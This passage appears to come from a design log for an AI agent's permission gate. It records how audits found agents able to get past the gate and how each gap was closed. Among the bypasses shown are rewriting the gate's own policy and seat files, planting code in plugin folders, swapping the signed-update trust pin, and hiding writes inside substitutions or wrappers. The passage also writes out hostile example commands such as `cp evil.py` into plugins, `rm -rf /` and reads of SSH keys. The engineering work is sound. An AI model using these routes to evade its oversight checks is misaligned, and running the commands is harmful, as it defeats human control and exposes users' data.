  `mv ~/.exo /tmp/x` asked, `mcp__filesystem__move_file` with the same args was a `remote_write` that only logged,
  and a store path under `to`, `target`, `new_path`, `old_path`, `from` or `dst`
  (`rename_file {"path": "~/.ssh/id_rsa", "new_path": "~/.exo/policies/gates.yaml"}`,
  `move_file {"source": "/tmp/a", "to": "~/.exo/policies/gates.yaml"}`) was missed: beside a secret it got no store
  write part, so a seat delegated `credentials` could answer it, and with no secret it was no store write at all.
  Now the scan reads those keys too, a tool whose name says move or rename (`_WIDE_WORDS`, a camelCase name split)
  passes `ancestors=` as `mv` does, with or without a secret, so a camelCase delete of the home
  (`deleteFile ~/.exo`) asks as `rm -rf ~/.exo` does, and a read-verb tool that writes what it took where its path
  arguments say (`download_file`, `export_report`; `_FETCH_WRITE_WORDS`) runs the store scan, so a download into
  the policy files asks while a plain read of the store stays a read. A relative destination is read from the
  session's folder the core passes (#209), as `_sensitive_words` reads a relative secret name:
  `move_file` to `policies/default.yaml` from a session folder in `~/.exo` is a store write, and beside a secret it
  is a part, so only the principal answers. The resolution is the file tools' own: a shell line still reads its
  store writes from its own words, so `echo x > gates.yaml` with `~/.exo/policies` as `cwd` stays a `local_write`
  (#453), and the gate's own folder is not one of the bases, where a bare `run` word is not the run folder
  (#D-039). A copy of the store keeps its reading (`copy_file ~/.exo -> /tmp/x` is no store write, as `cp -r`
  reads it), and a read tool without a write word (`fetch_log`) is not scanned. Chosen over scanning every string
  argument for the store, which would read a write's `content:` that quotes a store path, and over resolving
  relative names in the shell's per-word scan, which cannot tell a write's operand from a read's
  (`cat *` beside the folder's read part in `~/.exo/run` would have made the line a store write where the
  #452 tests keep it a force push beside a part). D-074's config file is reached under the new keys and from the
  session folder as under `path` (`move_file {"source": "/tmp/a", "to": "~/.exo/config.json"}`,
  `write_file "config.json"` from a session folder in the home), read as before D-074 in the ordinary reading as
  every other way of reaching it is. The gate differential against the main checkout dcab371a (`scripts/
  gate_diff.py --no-variants --jobs 4`, base main, head this branch) finds 0 lowered pairs: 11,114 actions x 87
  policies, 5,988 pairs tightened on 102 actions (unknown, read, local_write and remote_write allow to
  `store_write` ask, and to `credentials` ask where the new keys name a secret), 409 pairs reworded in detail.
  Tests beside the #489 rows (`plugins/exo-gate/tests/test_store_floor_any_part.py`) and in the D-074 file
  (`tests/security/test_gate_config_store.py`).
- *Amendment 2026-10-26 (issue #651):* a read-verb name that says it replaces the file its path names runs the
  store scan as a write's, as the #494 fetch words do: the name's replace, substitute, patch, edit, update and
  sed words join `_FETCH_WRITE_WORDS`, and arguments that carry the old text and the new beside the path they
  name are the replace signal of a name that does not say so. `mcp__fs__search_replace
  {"path": "~/.exo/seats/principal.toml", "search": "ask", "replace": "bypass"}` was a `read` in every
  permission mode, so the seat file's default could be made bypass with no ask, which the seat's bypass reading
  (D-065) does not allow a non-principal hand to reach; the policy files and config.json were as bare. The
  replace is a `store_write` now, the principal alone answers it as `write_file`'s, and a plain read of the
  store stays a read. The differential against main fa5dfcd8 (`scripts/gate_diff.py --no-variants --jobs 4`,
  base main, head this branch) finds 0 lowered pairs: 11,868 actions, 2,040 pairs tightened on 24 actions (read
  allow to `store_write` ask, 72 of them to deny under a store_write deny policy), 1,616 pairs reworded in
  detail. Tests: `tests/security/test_gate_file_tool_replace_writes.py` (6 rows fail on main fa5dfcd8), the
  #651 rows in `plugins/exo-gate/tests/test_hook.py` (7 of 8 fail on main) and `test_bypass.py` (5 of 9 fail on
  main).
- **Why:** the 2026-10-12 audit reproduced that the gate classified by literal program name. A heredoc, `python -c`,
  `G=gh; $G` or a shell function walked past it as `shell` (allow). The model could also rewrite its own policy file,
  grant store and ledger with an allowed write, and the plugin reloaded policy on mtime, so the rewrite took effect on
  the next call. Audit priorities 1 and 2.
- **Decision, shell:** an allowlist. A small lexer splits the line into simple commands and finds each program
  position. A command is `allow` only when every program is known and nothing is hidden. Anything else is the new
  category `opaque_exec` (asks): variables, `$( )` or globs in program position, script files, shells and
  interpreters running text, `make`, `npm run`, `npx`, `xargs`, `find -exec`, `eval`, `source`, functions, aliases,
  git and gh aliases, unknown programs. Where the gate can see inside it classifies the inner text too and keeps the
  stricter; the `indirection` signal makes `decide` ask even if the inner part only logs. An "always" on opaque code
  covers that exact command only. The principal can lower `opaque_exec` only by naming it in a category line or rule.
  The old program and prefix cases are gone; one classifier serves the core and the `exo-gate` plugin.
  *Amendment 2026-10-17 (issue #178):* naming `opaque_exec` at any level turned the indirection floor off, so
  `categories: {opaque_exec: deny}` let `bash -c 'git push origin main'` fall back to the push's own `log`. Only a
  name that lowers it (a category line, or the first matching rule on `opaque_exec`, at `log` or `allow`) turns the
  floor off now. Naming it at `ask` or `deny` keeps the floor, so a command read inside a wrapper asks at least.
  *Amendment 2026-10-17 (issue #184):* a path word is matched against the secret stores after bash brace
  expansion, scanned as bash scans it: a shell word from its source text, so only unquoted braces expand. The word
  and every word its comma groups and `{x..y}` sequences make are checked, and a hit on any counts; past 1,024
  words or 32 levels of nesting, or past 4,096 expanded words in one tool call, the word counts as a store path
  (fails closed, no grant). `cat ~/.config/gh/{hosts,x}.yml` was an allowed read.
- **Decision, store:** `policies/`, `state/`, `ledger.sqlite*`, `keys/`, seat files and the sockets under `$EXO_HOME`
  or the principal store are on a protected list. Any write is `store_write`: a floor like credentials, no standing
  grant, principal-only (`approvals.yaml` cannot add seats), enforced in observe mode. Reads stay `read`; `keys/`
  reads stay `credentials`.
  *Amendment 2026-10-18 (issue #224):* a write target is matched against the protected list after bash brace
  expansion, read as for the secret stores (#184): a shell word from its source text, a file tool's path as
  written. A hit on any expanded word counts, and a word past the brace limits counts as the store. The store
  checks have their own 4,096-word budget per tool call. `echo x > ~/.exo/polic{i..i}es/default.yaml` was an
  allowed local write.
  *Amendment 2026-10-18 (issue #241):* the store-read guarantee covers the search tools. The gate checks only the
  `path` a `grep` or `glob` call names, and the tools walked everything below it, so `grep {pattern: "key", path:
  HOME}` returned `~/.aws/credentials`, `$EXO_HOME/keys/*` and the principal credential as an allowed read. The tools
  now leave out every folder and file below the root that `is_sensitive_path` matches, as found and as resolved (a
  link into `~/.ssh` by any name), do not enter a store folder, and end with `[skipped N secret-store paths; read one
  by name to be asked]`. A store the call names is read after the gate asks; a link out of it into another store is
  still left out. `~/.ssh/..` only looks like a store: it walks the home folder with the stores left out. A
  store-named link to an ordinary folder (`x.key` to the home folder) returns nothing, since every path below it still
  looks like a store (fail closed). A root whose real path is `/` is refused (the walk takes minutes). In a repo's own
  `.claude` folder (beside a `.git`, not `~/.claude` or `CLAUDE_CONFIG_DIR`, holding no Claude login, transcripts or
  shell snapshots) only `worktrees`, `commands`, `agents` and `skills` are searched, so a `.claude/worktrees` checkout
  is searchable and another home's config folder is not. `code_find`, whose `jg` walks the folder itself, refuses a
  folder that is or holds a known store. Chosen over a gate-side ask for every broad search because a search of a
  project or the home folder stays an allowed read and only the stores drop out; the count keeps the result honest.
  *Amendment 2026-10-18 (issue #169):* the run folder is a secret store (D-039 limits, `docs/GATE.md` "Who
  answered"), and a secret wins over the store rule, as for `keys/`. So a write, delete, move or replacement that
  touches the folder itself or a credential file in it is `credentials`, not `store_write`: `rm -rf ~/.exo/run`,
  `rm ~/.exo/run/*`, and moving or replacing the folder that holds the core sockets (`mv ~/.exo/run x`,
  `ln -sfn /tmp/x ~/.exo/run`, `cp -rT /tmp/x ~/.exo/run`, `mkdir -p ~/.exo/run`, `chmod 777 ~/.exo/run`). It
  still always asks and is never granted, but it is no longer principal-only: a seat that `approvals.yaml`
  delegates `credentials` to, or lists in `default:` with no `credentials:` line, may answer it, and
  `deny: [store_write]` no longer matches it. Job output in `run/jobs/` and a socket or pid file named alone stay
  `store_write`. Chosen because one class per call keeps the read and write rules of a secret store the same;
  keeping the store part principal-only through `_combine` is a follow-up.
  *Amendment 2026-10-19 (issues #210, #269, #217):* three gaps in what the gate guards of its own inputs. The bus
  folder `$EXO_HOME/bus` joins the protected list, with `bus/registry.json` and `bus/relay.sqlite*` as distinctive
  names, and so do the files `EXO_BUS_REGISTRY` and `EXO_BUS_DB` and the folder `EXO_BUS_KEYS_DIR` point to (and their
  legacy `DIVAN_` names, both when both are set), because the registry is where signed seat answers find their keys.
  On a line that reaches a folder in `$EXO_HOME`, a relative name is checked as the path it names, resolved as the
  kernel resolves it from each such folder, so `..` from `run/jobs` reaches the run folder's secrets; `run` stays out
  of the store-folder list, since that would make job output a secret. A write through a descriptor or
  process-folder path (`/dev/fd/N`, `/dev/stdin`, `/proc/<pid>/{fd,cwd,root,map_files}`) is `store_write`, other
  than the writer's own stdout and stderr, and so is a store path opened for reading on a numbered descriptor; the
  lexer keeps a redirection's fd number for that; on stdout and stderr any target the gate cannot pin to a path (a
  variable, a glob, a relative name) counts. The `$EXO_HOME` resolution charges each join, as it is made, the path
  parts it builds, to one budget per tool call (65,536 parts) shared by every `$( )`, and asks once it is spent or
  past 64 store folders, so it stays linear in the line. Chosen over resolving those paths, which the gate can
  only do in its own process, and over making every write to `/dev/fd/1` ask. Left out: trusting the bus registry
  for seat keys only when `EXO_BUS_LEADER_PUBKEY` is set (#210's defence in depth), which changes who can answer.
  Not done: a write back through a link to a descriptor path, `/dev` or `/proc/self` made out of the gate's sight,
  after an open on descriptor 3 or above the gate cannot read; a hardlink to a store file opened on stdout; and a
  walk over a folder above the run folder.
  *Amendment 2026-10-21 (issue #435):* the plugins folder `$EXO_HOME/plugins` joins the protected list, and
  `.exo/plugins` counts as a name anywhere, as `.exo/bus` does. The core loads each plugin it finds there and runs its
  code inside the harness with the harness's rights, so a write there installs or changes code the next session runs.
  `cp evil.py ~/.exo/plugins/foo/__init__.py` was an allowed `shell`, and `write_file` on that path an allowed
  `local_write`. Only a writing command after a `cd` or `git -C` into the home asked as a store write, and a delete
  asked as a plain `delete`. Now any write into the folder is `store_write`, in every spelling the store check reads,
  and a read with a read command stays a read. Because the folder is a store path, a narrowing of that `cd` rule to
  the home's other folders (#203) leaves it out with no rule of its own. The call keeps its own reading as a part, so
  a policy's denies on that reading still hold. A shell line keeps the command it was built from (D-075). A file tool
  (`write_file`, `edit_file`, `patch`, `apply_patch`, `move_file`, `create_directory`, `delete_file`) keeps a
  `local_write` part for each file it writes, or its own category, and a line that stands in a descriptor folder
  (`cd /dev && cp x ~/.exo/plugins/foo/y`) keeps that folder as a second target. Both come from D-075's amendment for
  #464 and #448 (#467), which landed first. So `deny: [local_write]`, `deny: [delete]`, `deny: [target:/dev*]`, the
  matching `categories:` lines, `reserved:` entries, rules and a matrix cell that denies the part still deny it. This
  change's first version, before #467, lowered both: a file tool's call was one `store_write` with no part, and the
  line in `/dev` took the plugins path as its only target. #467 lifts both groups. `deny: [store_write]` still denies
  such a call in every spelling. A `target:` entry on the folder denies it only in the spelling it names
  (`target:~/.exo/plugins/*` misses `$HOME/.exo/plugins/x`). Left out, each for a later change. The folders in
  `$EXO_PLUGIN_DIRS`: section 4 of the developer guide points that variable at a checkout, so a principal-only floor
  there would ask on every edit. `$EXO_HOME/venv`: a floor on that folder would also ask whenever its own Python runs
  a test. A copy that lands on the folder by a source's name, or an archive unpacked into the home: #125's landing
  rule, in review, covers those for every protected folder. A relative path written by a tool whose working folder is
  in the plugins folder, as for every protected folder: the store check reads a relative path by its name alone. A
  per-name allowance for a plugin's own data, such as its `config.json` (#203).
  *Amendment 2026-10-21 (issue #133):* `$EXO_HOME/update` joins the protected list. It holds `allowed_signers`, the
  signed-update trust pin of D-073: with `update.require_signed` on, `exo update` installs the upstream tip only when
  it verifies against that file. A tool could rewrite it with no ask (`cp /tmp/evil ~/.exo/update/allowed_signers`
  was an allowed `shell`, a `write_file` there an allowed `local_write`), and the principal's next approved
  `exo update` would then install code signed by the tool's own key. Now a write to the folder or anything in it is
  `store_write` in every form the store checks read: `~`, `$HOME`, `$EXO_HOME` or a full path, a brace set, a
  relative name after a `cd`, a file tool, and a removal, move, link or mode change of the folder. `.exo/update`
  counts whatever `EXO_HOME` is, and `update/allowed_signers` is a distinctive name, as `state/gate-grants.json` is,
  so a relative write to it counts under the shell tool's own `cwd` argument too, which the store checks do not
  read. `exo update --pin-trust` is `store_write` as well. Its old `opaque_exec` reading stays a part, so a policy
  that denied it still does, and one that names `opaque_exec` at `allow` or `log` now asks. Reads stay `read`. A
  project folder called `update`, `$EXO_HOME/updates` and `$EXO_HOME/update.json` keep their class. A project file
  at `update/allowed_signers` asks. The pin lives in `$EXO_HOME` only, so the principal stores get no `update`
  entry. This closes the gap the D-073 amendment of 2026-10-17 named for the pin. `config.json` stays an ordinary
  local write until D-074 (#125). The gate differential against main (#423), with a corpus of these forms added,
  lowered 37 pairs on 15 actions in the original corpus. The expanded review corpus found a third kind below.
  In each kind the pin now decides as `state/` and `bus/` files already
  decide on main, and the line still asks the principal alone, with no grant. (1) A file tool's write or delete
  on the pin or the folder (any file tool, such as `write_file`, `edit_file`, `patch`, `apply_patch`,
  `create_directory`, `move_file` or `delete_file`) was
  `local_write` or `delete` and is now `store_write` alone, so `deny: [local_write]` or `deny: [delete]`, a
  `categories:` deny or a rule on those categories no longer denies it, and a `reserved: [delete]` entry no longer
  marks it (31 pairs on 9 actions). A shell write keeps its `local_write`, `shell` or `delete` part beside the store
  part, so its category deny holds (D-075). (2) After `cd /dev`, a line that names a store path (`printf x > update/allowed_signers`,
  or a path through `.exo/update`) takes that name as its target where it took `/dev`, so a `target:/dev*` deny no
  longer matches it (6 pairs on 6 actions). This also covers credentials commands naming the pin.
  (3) The matrix reads the dominant part only. A remote delete such as `ssh host 'rm -rf ~/.exo/update'`
  changes from a matrix deny on delete to the principal-only store-write ask, as deleting `~/.exo/state`
  already does. Category denies still read the retained delete part. Chosen over keeping a file tool's old category as a part, which would
  change the decisions for every store path, not only the pin's. That is a follow-up for the whole store. (The
  D-075 amendment of 2026-10-22 for #464 and #448 is that follow-up, and lifts all three kinds.) Not done,
  as for the other store folders (`docs/GATE.md` "Known limits"): a glob or hard-link spelling, a copy or archive
  unpacked into the home folder that makes `update/` from its source name (`cp -r /tmp/x/update ~/.exo/`,
  `tar -C ~/.exo -xf x.tar`), a relative name other than `update/allowed_signers` under the shell tool's `cwd`
  argument, and a path held in a variable or made by a command (`F=~/.exo/update/allowed_signers; cp x "$F"`).
  *Amendment 2026-10-22 (issue #447):* who may answer an ask, and whether a grant may cover it, read only the category
  that leads the line. `_combine` ranks credentials above store_write, so `env; echo x > ~/.exo/policies/gates.yaml`
  and `cat ~/.kube/config; cp evil.yaml ~/.exo/policies/default.yaml` were `credentials`, and a seat that
  `approvals.yaml` delegates `credentials` to could approve a write to the policy files. The outcome stayed ask, so
  the #423 differential could not count it. Now the hook reads the line's `credentials` and `store_write` parts.
  `gate.call_approvers` keeps only those allowed for the line's category and for each such part, so a store write
  part leaves the principal alone. Other parts do not narrow the approvers: under `force_push: [principal]`,
  `env; git push --force origin main` keeps the seats `credentials` allows. `gate.no_grant` keeps a standing grant
  off a line with such a part, observe mode enforces it, and `binds_exact` binds it to the exact line. This holds
  behind a wrapper (`sudo`, `doas`, `env`, `timeout`, `nice`, `command`, `bash -c`, `eval`, `xargs`), in a compound,
  a subshell, a `$( )`, a heredoc or a `cd` chain, wherever the gate reads the store write as a part. The line's
  category, its matrix cell and its outcome do not change. Reading every part for the approvers, the matrix, third
  party and floors is #437. This is the follow-up the #169 amendment named: a shell write, delete, copy or archive in
  `keys/` or the run folder that the gate reads as a write stays `credentials`, but its store write part makes it
  principal-only. A copy read only as a key read (`tar czf /tmp/k.tgz -C ~/.exo keys`,
  `cat < ~/.exo/keys/seat.key > /tmp/k`) keeps the delegation, as before. It also settles point (5) of the #313
  amendment. A secret read alone keeps its delegation. A file tool that names a secret and a store file was
  `credentials` with no store write part (the #467 review: `apply_patch` on `~/.ssh/config` and
  `~/.exo/policies/gates.yaml`, `move_file` from `~/.ssh/id_rsa` to `~/.exo/policies/gates.yaml`), so a seat
  delegated `credentials` could answer it. `classify` now adds a `store_write` part for each store file such a tool
  writes, moves, copies or deletes, beside the tool's own part (#448). A folder holding the store that it moves,
  renames or deletes gets one too, as with `mv` and `rm` (`move_file` from `~/.exo` to `~/.ssh/x`). So does a tool
  with a camelCase name (`moveFile`, `deleteFile`): this check splits the name. (When this was written the call's
  category stayed `unknown`, because the gate read the name as one word; since #515 the call leads with its hump
  words' category, `local_write` or `delete` as `move_file` and `delete_file` do, and `unknown` is its `floor`
  reading.) With no secret, a file tool's move of such a folder is not a store write
  yet (#494). A file tool's write or delete in `keys/` or the run folder gets a part as well, as its shell spelling
  does. The call's category, target and card do not change. The hook's error fallback (#464) reads the parts as
  well. Chosen over ranking store_write first in `_combine`, which would change the line's category, reason and
  policy matches. The gate differential against main 5a9dc394 (`gate_diff`, #423, main's script) finds 0 lowered
  pairs. On the built-in corpus, 55,253 actions x 87 policies, it finds 285 pairs on 115 actions tightened, all
  `credentials` ask to deny. On a focused corpus of 17,930 actions it finds 24,383 pairs on 9,764 actions tightened,
  also `credentials` ask to deny. That corpus has file tools under 13 names, `moveFile` among them, that move,
  rename, copy or delete a store file or a folder holding the store beside one of 7 secrets or a plain path, in both
  directions, under three key pairs and in `paths` or `files` lists, calls with two store paths, and shell spellings
  behind wrappers, in compounds, a `$( )`, a heredoc, `ssh`, `execute_code` and after a `cd` into the store. The
  tightened pairs are the file tools' new store write parts under a `store_write` deny or category line, or a
  `target:` deny on the store. A `reserved: [store_write]` entry now also hits them, with the same outcome. A count
  of the hook's terms on main and here over the same corpora, under three `approvals.yaml` tables that delegate to a
  seat, finds the approvers narrowed to the principal on 605 built-in and 11,110 focused actions, each `credentials`
  with a `store_write` part. None widens, and no once-only flag, exact binding or category changes.
  *Amendment 2026-10-24 (issue #447, with main d79639f1):* #399 reads a gh line two ways: as gh reads it, and as the
  gate read it before (`floor`). Main's hook took who may answer, "once", grants and observe mode from the category of
  each reading. This change read the parts of the line only. Now `gate.readings` gives the line and its floor, and
  `gate.no_grant` and `gate.call_approvers` read every part of each. So a store write beside a secret read keeps a gh
  line the gate reads two ways with the principal, in either order, also when only one reading holds the part. In
  `env; gh -R pub/repo release download v1 -D ~/.exo/policies` only the reading before #399 writes the store, since
  gh's own reading takes `release download` for a read (#461). Main let a seat delegated `credentials` answer it. The
  hook's own `_readings` and `_no_grant` are gone. It calls the gate's helpers, which have the names and shape of
  #452's (#311), less its `also` reading. `binds_exact` keeps #399's `alt_targets` and `floor` terms beside
  `no_grant`. Since #435 the plugins folder is a store folder, so a file tool that names a secret and a plugin file
  gets a store write part too. A call that does not write files and names a store path with no secret keeps #435's
  store write, with the call as its part. The gate differential against main d79639f1 (#423) finds 0 lowered pairs.
  The built-in corpus, 64,465 actions x 87 policies, tightens 309 pairs on 124 actions, all `credentials` ask to
  deny. A focused corpus of 10,583 actions x 113 policies tightens 292 pairs on 57 actions, the same way. It has
  the store write beside a secret read in both orders with 15 gh lines the gate reads two ways or on two targets,
  behind `sudo sh -c`, `bash -c`, `ssh` and `$( )`, and file tools on secrets, store files and plugin files. The
  tightened pairs are this change's store write parts of a file tool that names a secret and a store file, under a
  `store_write` deny or category line or a `target:` deny on the store. The same corpus against this branch before
  the merge (badf22eb) lowers 0 pairs.
  *Amendment 2026-10-22 (issue #435, review):* a call that sends a store file out keeps the call. The review's wider
  corpus found 414 more lowered pairs on #435's first version. An `email_send`, `web_post`, `github_post`,
  `social_post`, `publish` or `payment` tool call with a plugin file in `files:`, and a `curl -T`, `curl -F` or
  `mail -A` line, became `store_write` and lost the deny, matrix and rule outcomes and the posting violations of the
  send. Main then read `policies/`, `state/` and `update/` the same way. The first version's claims that both lowered
  groups arise only under a policy that denies or reserves the old category, and that no pair loses a posting
  violation, were wrong for these calls. Now three things hold. A tool call that names a store path and that the gate
  does not read as a file write or delete (its own category is not `local_write` or `delete`) is a `store_write` that
  keeps the call as a part, with its target, text, title and amount. The #191 pass decides that part by its own matrix
  cell too (D-075, the amendment for #464): the store outranks the send by its category, and its own cell (costly and
  private) would hide the send's, so a `deny` cell for the send denies the line. A here-doc body on a store line goes
  to a copy of the post the store write outranks, also a post inside a script fed to `bash`, so the posting rules read
  it as they did when the post was the line. So a deny, a reserved hit or a posting violation of the send holds as on
  main, and each such call still asks the principal alone when nothing denies it. For `policies/`, `state/` and
  `update/` the here-doc body is stricter than main: main keeps the send as a part since #467, but gives the body to
  no post, so `mail -A ~/.exo/policies/x a@b.c <<EOF` with a home path in the body lists no violation there. Not
  changed: commands that only read but are not read commands (`sed -n`, `tree`, `sort`, `uniq`, `xxd`, `bat`,
  `python3 -m json.tool`, `rsync -an`, a `grep` into a file elsewhere) ask the principal when they name a store path,
  as for `policies/` on main. GATE.md lists them as known friction. Reading them as reads is left for a later change
  (#482). The gate differential against main 5a9dc394 (#423) runs 92,317 actions under 95 policies. The corpus is the
  built-in one, a corpus of these sends under wrappers (`sudo`, `env`, `timeout`, `bash -c`, `ssh`, `mosh`), in
  compounds, `$( )` and here-docs, the reads above, and a checker's corpus of tools the gate reads as file writes by
  their name and more here-doc forms. The policies are the 87 built-in ones and 8 more, with denies on targets,
  reserved targets, tool names, a matrix and third parties. No pair loses a posting violation or a reserved hit. It
  lowers 30 pairs, all in one group, and each line still asks the principal alone, with no grant. Under `sudo`,
  `sudo -u` or `doas` over `ssh` or `mosh`, the wrapper makes the line's dominant part costly. The group covers any
  write into the folder or send of a file in it there, not only a send: `sudo ssh host 'scp <plugin file> host:/tmp/'`
  and `sudo ssh host 'cp evil.py ~/.exo/plugins/foo/__init__.py'` alike. The 30 pairs are the sends of the corpus
  above. The review's corpus of 4,248 plugin-folder items, which adds writes under these wrappers, lowers 4,961 pairs
  under 104 policies, all in this group (3,002 of them writes), and no other. On main a rule on `shell` or
  `local_write` with `reversibility: costly` matched that part, and so did a matrix that denies that cell while
  `store_write` has its own category line. The store write is now the dominant part, and the parts keep their own
  reversibility, so neither denies the line. It asks the principal alone, as the same line with a `policies/` file
  does on main. Before #467 landed, the same run against main 0f203e7f also lowered the two groups of the amendment of
  2026-10-21: a file tool's call (580 pairs, 124 of them for a tool
  the gate reads as a file tool by its name although it sends, such as `upload_file`) and a line in `/dev` (2,074
  pairs). #467 lifts both. A second corpus of 8,949 here-doc lines (a plugin, `policies/`, `state/` or `update/` file
  sent by `mail -A`, `mutt -a`, `curl -T` or `gh`, with a home path, a key or a footer in the body, under the wrappers
  above) runs 27,132 actions under the same 95 policies and lowers none. Since #468 (#465), main reads a `$( )`,
  backticks or `<( )` after a `cd` into the store in that folder, so such a write into the plugins folder asks on main
  and here alike. 1,303 lines that put #468's forms into the folder, or a plugin file into a `$( )` after a `cd`
  elsewhere, run 2,623 actions under the same 95 policies. They lower 67 pairs, all in the group above: a `sudo ssh`
  send of a plugin file, also in a `$( )` after a `cd` into the store or `/dev`, where main's line is a store write
  that the costly `shell` part denies.
  Against main 8c09c29c, the review's corpus under 148 policies lowers 11 more pairs, in a second group:
  `git push --force` followed by `rm` or `rm -rf` in the folder, under a matrix that denies the push's irreversible
  cell and an anchored `'^git push'` command rule that allows. On main the push leads that line. The rule step passes
  the rule over, since the line holds a command the rule does not name, so the matrix deny stands. Now the plugins
  folder is a store, so the store write leads. #191's pass reads the push part's matrix deny and then lifts it,
  because the anchored rule matches both the line and the part's own text (#394, #464). So the line asks the principal
  alone. With the `rm` first, the rule does not match the line, and the deny stands. This order rule is main's: each
  of the 11 decides as main decides the same line with a `policies/` file, on category, outcome and rule. The group
  was wider than `rm` (#547): any send or write of a store file after the push, in any store folder, met the same lift,
  and `gh gist create`, `aws s3 cp` and `gh issue create -F` tails with a `plugins/` or `policies/` file still asked
  on main f28934a3 (`store_write ask floor`, or `ask posting`). An `rm` tail and a `curl -T` tail of a `plugins/`,
  `policies/` or `state/` file, joined by `&&`, `;` or `||`, were already denied there (`store_write deny matrix`),
  by the delete's or the upload's own cell, and a `keys/` file makes a secret line main denies. The amendment of
  2026-10-28 for #547 (the last of this entry) ends the lift on a store line.
  With #320 (the amendment of 2026-10-22 for #225, #269, #309 and #341, below), `_run_privileged` adds a costly
  copy of each reversible part that `sudo` or `doas` runs over `ssh` or `mosh`, so the first group's rule on a
  costly `shell` or `local_write` part and its matrix cell deny those lines again, as on main.
  *Amendment 2026-10-22 (issue #465):* a writing command after `cd` into the store is a store write, but the `cd`
  reached only the line's own commands. Each `$( )`, backticks and `<( )` body was classified as a fresh line, so
  `cd ~/.exo/policies && echo $(cp /tmp/evil gates.yaml)`, the `x=$( )`, `cat <( )`, backtick and nested forms,
  `cd ~/.exo/state && echo "$(cp /tmp/g.json approval-grants.json)"` and `cd /dev && echo $(cp /tmp/evil fd/3)`
  were allowed with no ask, under the default policy too, while the unwrapped `cp` asked the principal. Bash runs
  a substitution where its command runs. Now a substitution of a command after the `cd` into the store or a
  descriptor folder is classified in that folder, as the same command unwrapped is: a command the gate does not
  read as a read (a write, and also `sed`, `sort`, `curl` or an interpreter) is a store write, with the
  descriptor folder as the target after `cd /dev`, and a read (`cat`, `grep`, `git log`) stays a read. So the #338
  friction after `cd /proc` or `cd /dev` reaches such substitutions too. A substitution in the `cd` itself or in a
  command before it runs where the line started, so it is read as before
  (`cd /proc/$(docker inspect -f '{{.State.Pid}}' web) && cat status` stays a read). Its place in the line decides,
  not its text, so a copy of its text before the `cd` changes nothing. One in a here-doc body counts as after every
  command on its line. One in the redirections of a compound that holds the `cd` runs before the compound, as bash
  expands them first (`while read f; do cd ~/.exo/state; done < <(sort list)` stays a read). As for the line's own
  commands, a subshell `cd`, a later `cd` out of the store and a `cd` in a function body are not followed, so those
  fail closed (`(cd ~/.exo) && echo $(sort x)` asks). A loop that enters the store runs its earlier commands there
  on its next pass, which was not followed either (#480) until the #479 amendment of 2026-10-28. A line nested in
  the substitution keeps its own folder: an `ssh` remote command runs on its host, while a local `bash -c` in the
  substitution is itself a command in the store. A `declare` or `local` value that bash runs again after the `cd`
  (`declare -a x='($(cp /tmp/evil gates.yaml))'`) is classified in the folder as well. Each text is still
  classified once per depth in a call (#334), now once for each folder as well, so the same `$( )` read outside
  the store and in it on one line is read in both. This needs the D-075 amendment for #464: without it, a command
  in such a `$( )` whose matrix cell denies it (a force push, a post, a delete) would lose that deny beside the new
  store write. Two more checks keep such a command as strict as when it decided the line. A part read from a nested
  line carries that line as its text, so an anchored allow rule (`{command: '^git push', decision: allow}`)
  lifted the push in the #191 pass, though it does not lower the line when the push decides it (#394). A rule
  keyed on `command` that would lift a part must now match the whole line too. And a credentials line takes the
  weight of an irreversible command from its own parts, so a delete held by a store write in a `$( )`
  (`cd ~/.exo/keys && echo $(rm -f x)`) no longer made it irreversible. A heavier command deeper in the line is now
  a credentials part with that weight beside it, which the #191 pass reads, so a deny on its matrix cell holds. The
  line keeps its own weight, so a policy whose costly cell is stricter than its irreversible one still denies
  `cat ~/.ssh/id_rsa; ssh prod 'rm -rf /'`, which an earlier commit here made irreversible (#468 review). The
  credentials part #464 adds for a relative key read on a store-write line weighs the same way, so
  `cd ~/.exo/state && cat ../keys/seat; echo $(rm -rf x)` denies under an irreversible deny cell or rule as on main,
  and the unwrapped `cd ~/.exo/state && cat ../keys/seat; git push --force origin main` tightens from ask to deny. With
  these, every change makes a line stricter or leaves it alone, but for one group gate_diff reports. Under
  `reserved: ['command:\brm\b']`, `cd ~/.exo/policies && declare -a x='($(ssh prod 'rm -rf /'))'` had its
  reserved hit on `opaque_exec` and now has it on `store_write`. Both ask, the store write only the principal, and
  a store write takes no standing grant, so the hit changes nothing. gate_diff (#423) ran main c27d8739 against
  this change over the built-in corpus, 12,780 lines of substitutions around a `cd` into 14 folders, 28 lines from
  the review, the 2,127 #464 lines, 1,932 lines with a copy of the substitution's text before the `cd`, 3,000 lines
  with a compound around the `cd` and a substitution in its redirections, 384 lines with a secret beside a heavier
  command, 288 with a relative key read beside one, and the 1,716 `unset` lines of the #404 review, under the 87
  built-in policies and 23 more. The #460 script read 103,366 actions: 0 outcomes lower, 4 pairs with the reserved
  hit above, 2,048 pairs reworded. Main's script (run before the key-read weight) reports those 4 and 256 pairs on
  64 lines as violations lost. In
  `cd ~/.exo/policies && echo $(echo $(gh pr comment 3 --body hi))` the post's bare violation is now named after the
  post, since the store write sets the card. Both trees list it, and the #460 script counts it as reworded. 685,477
  pairs are stricter, nearly all the store-write ask on the forms above.
  *Amendment 2026-10-26 (issue #459):* the other folders Exo loads code from join the protected list, as the
  plugins folder did (above, #435): the venv, Hermes' plugin home, the source copy and the folders
  `$EXO_PLUGIN_DIRS` names. Each is code the next session or this one loads and runs: the venv holds the `exo`
  package and this gate itself, so a changed `gate.py` decides every later call and a `.pth` file in its
  site-packages runs on every interpreter start (a changed gate could rule its own change and any later write
  through); with `--with-hermes` the core loads exo-gate from Hermes' plugin home; the installer clones a git
  URL into `$EXO_HOME/src/exo` and `exo update` copies plugins from the copy, and `exo web` reads plugins from
  `<package>/../../plugins` of the installed copy; `default_dirs` searches `$EXO_PLUGIN_DIRS` first and keeps
  the first plugin found of a name, so a plugin named `exo-gate` in a folder there takes the real one's place.
  Each is read as the environment the gate sees spells it, as EXO_HOME is: the venv `EXO_VENV` names, else the
  home's own `venv`; Hermes' plugin home under `EXO_HERMES_HOME`, else the home's own `hermes-home/plugins`;
  the home's `src`; every non-empty, absolute dir in `EXO_PLUGIN_DIRS` split on `os.pathsep`. A Hermes home
  only config.json or a later `set_cfg` names is not read: the gate reads no config.json content (D-074), so
  write the locations into the environment. And, by name, `.exo/venv`, `.exo/src` and
  `.exo/hermes-home/plugins` match anywhere in a path, as `.exo/plugins` does — the two names stay out of the
  default spellings: a relative `EXO_VENV` or dir is a constant of the tool's working folder, which the gate
  cannot see, and a `.venv` name is not Exo's (no install script makes one, EXO_VENV is the only override),
